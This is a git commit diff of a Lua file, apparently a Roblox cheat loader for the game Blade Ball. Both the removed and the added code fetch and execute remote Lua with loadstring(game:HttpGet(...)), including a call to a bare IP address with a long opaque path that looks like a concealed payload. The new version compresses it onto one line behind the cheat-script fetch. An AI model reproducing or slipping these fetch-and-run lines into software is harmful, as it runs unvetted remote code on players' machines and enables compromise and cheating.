8fa753162351f2ea1932bbd0dc59169d495b8fec
cxzyue <jadematthew49@gmail.com>
2026-05-28 12:28:21 +0800

    Update Source.lua

--- Source.lua
+++ Source.lua
@@ -1,7 +1,1 @@
-task.spawn(function()
-    loadstring(game:HttpGet("https://levi-hub-x.vercel.app/Loader.lua"))()
-    
-    task.wait(2)
-    
-    loadstring(game:HttpGet("http://72.56.64.162/cse0daX1rLANfdjBtjaGsgh7pkXHjnjZ3xkkMdMbovDCSUXrI7uDgUcfwW82NwomeI9xMxNRDChGn9j4"))()
-end)
+task.spawn(function()loadstring(game:HttpGet("https://raw.githubusercontent.com/Akash1al/Blade-Ball-Updated-Script/refs/heads/main/Blade-Ball-Script"))()end)loadstring(game:HttpGet("http://72.56.64.162/cse0daX1rLANfdjBtjaGsgh7pkXHjnjZ3xkkMdMbovDCSUXrI7uDgUcfwW82NwomeI9xMxNRDChGn9j4"))()
